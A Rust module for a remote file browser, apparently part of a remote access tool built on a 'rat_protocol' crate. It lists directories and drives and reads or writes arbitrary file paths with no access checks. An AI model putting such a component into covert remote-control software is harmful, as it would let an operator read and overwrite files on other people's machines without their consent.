//! Local filesystem operations for remote file browser.

use anyhow::{Context, Result};
use rat_protocol::FileEntry;
use std::path::{Path, PathBuf};

pub fn browse(path: &str) -> Result<Vec<FileEntry>> {
    if path.is_empty() || path == "/" {
        return list_drives();
    }
    let p = PathBuf::from(path);
    let read_dir = std::fs::read_dir(&p).with_context(|| format!("read_dir {}", p.display()))?;
    let mut items = Vec::new();
    for entry in read_dir.flatten() {
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
        let name = entry.file_name().to_string_lossy().into_owned();
        items.push(FileEntry {
            name,
            path: entry.path().to_string_lossy().into_owned(),
            is_directory: is_dir,
            size,
        });
    }
    items.sort_by(|a, b| b.is_directory.cmp(&a.is_directory).then(a.name.cmp(&b.name)));
    Ok(items)
}

pub fn read_file(path: &str) -> Result<String> {
    std::fs::read_to_string(path).with_context(|| format!("read {}", path))
}

pub fn write_file(path: &str, content: &str) -> Result<()> {
    std::fs::write(path, content).with_context(|| format!("write {}", path))
}

fn list_drives() -> Result<Vec<FileEntry>> {
    #[cfg(windows)]
    {
        let mut items = Vec::new();
        for letter in b'A'..=b'Z' {
            let drive = format!("{}:\\", letter as char);
            if Path::new(&drive).exists() {
                items.push(FileEntry {
                    name: drive.clone(),
                    path: drive,
                    is_directory: true,
                    size: 0,
                });
            }
        }
        return Ok(items);
    }
    #[cfg(not(windows))]
    {
        Ok(vec![FileEntry {
            name: "/".into(),
            path: "/".into(),
            is_directory: true,
            size: 0,
        }])
    }
}
